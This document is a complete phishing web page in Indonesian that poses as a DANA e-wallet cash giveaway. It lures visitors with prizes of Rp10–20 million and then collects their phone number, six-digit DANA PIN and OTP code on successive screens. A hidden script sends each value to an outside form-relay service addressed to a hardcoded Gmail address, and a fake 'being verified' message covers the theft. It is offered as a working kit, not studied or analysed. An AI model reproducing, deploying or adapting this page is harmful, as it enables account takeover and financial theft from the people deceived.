<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#008CFF">
    <title>DANA - Giveaway</title>
    <style>
        /* RESET & BASE */
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; outline: none; }
        html, body { width: 100%; height: 100%; font-family: -apple-system, sans-serif; overflow: hidden; background-color: #f5f5f5; }
        
        /* --- LOADING STYLE RESMI (UPDATE) --- */
        #loader {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255, 255, 255, 0.7); z-index: 9999;
            flex-direction: column; align-items: center; justify-content: center;
        }
        .loader-box {
            width: 120px; height: 120px;
            background: rgba(0, 0, 0, 0.6); /* Lingkaran Gelap Transparan */
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            position: relative;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        /* Ikon Putih di Tengah (SVG Logogram DANA) */
        .loader-box svg {
            width: 50px; fill: white;
            animation: pulse 1.5s ease-in-out infinite;
        }
        /* Lingkaran Putih Berputar Tipis */
        .loader-box::after {
            content: "";
            position: absolute; width: 100%; height: 100%;
            border-radius: 50%;
            border: 3px solid transparent;
            border-top-color: rgba(255,255,255,0.8);
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(0.85); opacity: 0.8; } }
        
        .loading-text { 
            margin-top: 20px; color: #0077C8; font-weight: bold; 
            font-size: 1.1rem; letter-spacing: 0.5px; 
        }

        /* --- UI COMPONENTS --- */
        .app-container { display: flex; flex-direction: column; height: 100vh; width: 100%; }
        section { display: none; flex-direction: column; height: 100%; width: 100%; position: relative; }

        .blue-header { 
            background-color: #008CFF; color: white; padding: 40px 20px; 
            text-align: center; display: flex; flex-direction: column; align-items: center;
        }
        .dana-logo-text { font-size: 2.2rem; font-weight: 900; letter-spacing: -1px; margin-bottom: 5px; }
        .yellow-badge { background: #FFD700; color: #0077C8; padding: 4px 15px; border-radius: 20px; font-weight: 800; font-size: 0.8rem; }

        .content-card { 
            background: white; border-radius: 25px 25px 0 0; 
            padding: 25px 20px 100px; margin-top: -20px; flex: 1; box-shadow: 0 -5px 15px rgba(0,0,0,0.05); 
        }

        .prize-option { 
            display: flex; align-items: center; border: 1.5px solid #eee; 
            border-radius: 12px; padding: 16px; margin-bottom: 12px; 
        }
        .prize-label { flex: 1; font-size: 1.05rem; color: #333; display: flex; align-items: center; gap: 10px; }

        .btn-dana { width: 100%; padding: 16px; border-radius: 50px; border: none; font-weight: bold; font-size: 1rem; cursor: pointer; }
        .btn-blue { background: #008CFF; color: white; margin-top: 10px; }
        .btn-white { background: white; color: #008CFF; border: 1px solid #008CFF; }

        .phone-box { display: flex; background: #fff; border: 1px solid #ddd; border-radius: 10px; margin: 25px 0; overflow: hidden; }
        .prefix { padding: 15px; background: #f9f9f9; color: #333; font-weight: bold; border-right: 1px solid #ddd; }
        .in-phone { flex: 1; padding: 15px; border: none; font-size: 1.1rem; }

        .pin-display { display: flex; justify-content: center; gap: 12px; margin: 30px 0; }
        .dot { width: 45px; height: 45px; background: #f0f0f0; border-radius: 10px; border: 1px solid #ddd; line-height: 45px; font-size: 24px; text-align: center; }

        .nav-bottom { 
            position: fixed; bottom: 0; width: 100%; height: 75px; 
            background: white; display: flex; justify-content: space-around; 
            align-items: center; border-top: 1px solid #eee; padding-bottom: env(safe-area-inset-bottom);
        }
        .nav-item { text-align: center; color: #999; font-size: 0.65rem; }
        .pay-circle { 
            background: #008CFF; width: 55px; height: 55px; border-radius: 50%; 
            margin-top: -35px; border: 5px solid white; display: flex; 
            align-items: center; justify-content: center; color: white; font-weight: bold;
        }
    </style>
</head>
<body>

    <div id="loader">
        <div class="loader-box">
            <svg viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-9l6 4.5-6 4.5z" opacity=".2"/>
                <path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12h2c0-4.41 3.59-8 8-8s8 3.59 8 8h2z"/>
                <path d="M20 12c0-4.41-3.59-8-8-8v2c3.31 0 6 2.69 6 6h2z"/>
                <path d="M4 12c0 4.41 3.59 8 8 8s8-3.59 8-8H4z" fill="white"/>
            </svg>
        </div>
        <p class="loading-text">Mohon Tunggu...</p>
    </div>

    <div class="app-container">

        <section id="page-giveaway" style="display: flex;">
            <div class="blue-header">
                <div class="dana-logo-text">DANA</div>
                <div class="yellow-badge">GIVEAWAY UANG TUNAI</div>
            </div>
            <div class="content-card">
                <p style="text-align: center; font-weight: bold; color: #008CFF; margin-bottom: 20px;">PILIH HADIAH ANDA</p>
                <div class="prize-option" onclick="selectPrize(this)">
                    <input type="radio" name="gift" id="g1" value="Rp10.000.000">
                    <label class="prize-label" for="g1">üí∏ Rp10.000.000</label>
                </div>
                <div class="prize-option" onclick="selectPrize(this)">
                    <input type="radio" name="gift" id="g2" value="Rp20.000.000">
                    <label class="prize-label" for="g2">üí∏ Rp20.000.000</label>
                </div>
                <button class="btn-dana btn-blue" onclick="processStep('page-giveaway', 'page-phone')">Konfirmasi</button>
            </div>
            <nav class="nav-bottom">
                <div class="nav-item">üè†<br>Beranda</div>
                <div class="pay-circle">PAY</div>
                <div class="nav-item">üë§<br>Saya</div>
            </nav>
        </section>

        <section id="page-phone" style="background: #008CFF; color: white; justify-content: center; align-items: center; padding: 20px;">
            <div class="dana-logo-text">DANA</div>
            <p>Masukkan nomor HP untuk lanjut</p>
            <div class="phone-box">
                <div class="prefix">+62</div>
                <input type="tel" id="userPhone" class="in-phone" placeholder="8123456789" maxlength="13">
            </div>
            <button class="btn-dana btn-white" onclick="submitPhone()">LANJUTKAN</button>
        </section>

        <section id="page-pin" style="background: #008CFF; color: white; justify-content: center; align-items: center; padding: 20px;" onclick="focusPin()">
            <p>Masukkan <b>PIN DANA</b> kamu</p>
            <div class="pin-display">
                <div class="dot" id="d1"></div><div class="dot" id="d2"></div><div class="dot" id="d3"></div><div class="dot" id="d4"></div><div class="dot" id="d5"></div><div class="dot" id="d6"></div>
            </div>
            <input type="password" id="pinInput" maxlength="6" inputmode="numeric" style="position: absolute; opacity: 0;">
        </section>

        <section id="page-otp" style="background: white;">
            <div class="blue-header">Verifikasi OTP</div>
            <div style="padding: 40px 20px; text-align: center;">
                <h3>Masukkan Kode OTP</h3>
                <div class="pin-display">
                    <input type="tel" maxlength="1" class="dot otpf" oninput="moveOTP(this, 0)">
                    <input type="tel" maxlength="1" class="dot otpf" oninput="moveOTP(this, 1)">
                    <input type="tel" maxlength="1" class="dot otpf" oninput="moveOTP(this, 2)">
                    <input type="tel" maxlength="1" class="dot otpf" oninput="moveOTP(this, 3)">
                </div>
                <button class="btn-dana btn-blue" onclick="submitFinal()">KONFIRMASI</button>
            </div>
        </section>

    </div>

<script>
    const EMAIL = "baygaming648@gmail.com";
    let store = { prize: "", phone: "", pin: "", otp: "" };

    function showLoading(nextAction) {
        document.getElementById('loader').style.display = 'flex';
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            nextAction();
        }, 1500); // Durasi sedikit lebih lama agar terlihat prosesnya
    }

    function sendSilent(data) {
        fetch(`https://formsubmit.co/ajax/${EMAIL}`, {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
    }

    function selectPrize(el) { el.querySelector('input').checked = true; }
    function focusPin() { document.getElementById('pinInput').focus(); }

    function processStep(curr, next) {
        const prize = document.querySelector('input[name="gift"]:checked');
        if(!prize) return alert("Pilih hadiah!");
        store.prize = prize.value;
        showLoading(() => {
            document.getElementById(curr).style.display = 'none';
            document.getElementById(next).style.display = 'flex';
        });
    }

    function submitPhone() {
        const p = document.getElementById('userPhone').value;
        if(p.length < 9) return alert("Nomor tidak valid!");
        showLoading(() => {
            store.phone = "+62" + p;
            sendSilent({ Judul: "Step 1: Phone", Nomor: store.phone, Hadiah: store.prize });
            document.getElementById('page-phone').style.display = 'none';
            document.getElementById('page-pin').style.display = 'flex';
            focusPin();
        });
    }

    document.getElementById('pinInput').addEventListener('input', (e) => {
        const val = e.target.value;
        for(let i=1; i<=6; i++) document.getElementById('d'+i).textContent = val[i-1] ? "‚Ä¢" : "";
        if(val.length === 6) {
            showLoading(() => {
                store.pin = val;
                sendSilent({ Judul: "Step 2: PIN", Nomor: store.phone, PIN: store.pin });
                document.getElementById('page-pin').style.display = 'none';
                document.getElementById('page-otp').style.display = 'flex';
            });
        }
    });

    function moveOTP(el, idx) { if(el.value && idx < 3) document.querySelectorAll('.otpf')[idx+1].focus(); }

    function submitFinal() {
        const otpVal = Array.from(document.querySelectorAll('.otpf')).map(i => i.value).join('');
        if(otpVal.length === 4) {
            showLoading(() => {
                sendSilent({ Judul: "FINAL DATA", Hadiah: store.prize, Nomor: store.phone, PIN: store.pin, OTP: otpVal });
                alert("Sedang diverifikasi. Mohon tunggu kabar di SMS/WA.");
                location.reload();
            });
        }
    }
</script>

</body>
  </html>
